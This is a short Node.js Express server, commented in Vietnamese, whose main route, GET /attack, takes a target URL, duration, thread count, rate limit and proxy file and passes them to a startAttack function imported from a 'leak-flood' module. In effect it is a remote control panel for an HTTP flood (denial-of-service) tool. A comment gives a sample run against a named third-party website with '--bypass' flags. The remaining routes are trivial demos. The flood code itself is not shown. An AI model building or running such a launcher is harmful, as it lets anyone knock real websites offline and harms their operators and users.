// server.js
// import express from "express";   // Nếu dùng ES6 module
const express = require("express");
// const express = require("express"); // Nếu dùng CommonJS
const { startAttack } = require("./leak-flood1.js");
const app = express();
const PORT = 3000;

// Middleware để parse JSON
app.use(express.json());

// Route GET đơn giản
app.get("/attack", (req, res) => {
    const target = req.query.target;
    const time = req.query.time;//miligiay
    const threads = req.query.threads;
    const ratelimit = req.query.ratelimit;
    const proxyfile = req.query.proxy;
    if (!target || !time || !threads || !ratelimit || !proxyfile) {
        res.send(`Tham so bi thieu`);
    }
    console.log('Attacking with params: ', target, time, threads, ratelimit, proxyfile);
    // target, time, threads, ratelimit, proxyfile
    // node leak-flood.js https://sunwin.pro/ 99999 15 2 500.txt --debug --reset --bypass
    startAttack(target, Number(time), Number(threads), Number(ratelimit), proxyfile);
    res.send(`Attack to ${target} width  started!`);
});

// Route GET với params
app.get("/user/:id", (req, res) => {
    res.json({ userId: req.params.id, name: "Khánh" });
});

// Route POST (nhận JSON body)
app.post("/echo", (req, res) => {
    res.json({ youSent: req.body });
});

// Lắng nghe cổng
app.listen(PORT, () => {
    console.log(`🚀 API server running at http://localhost:${PORT}`);
});
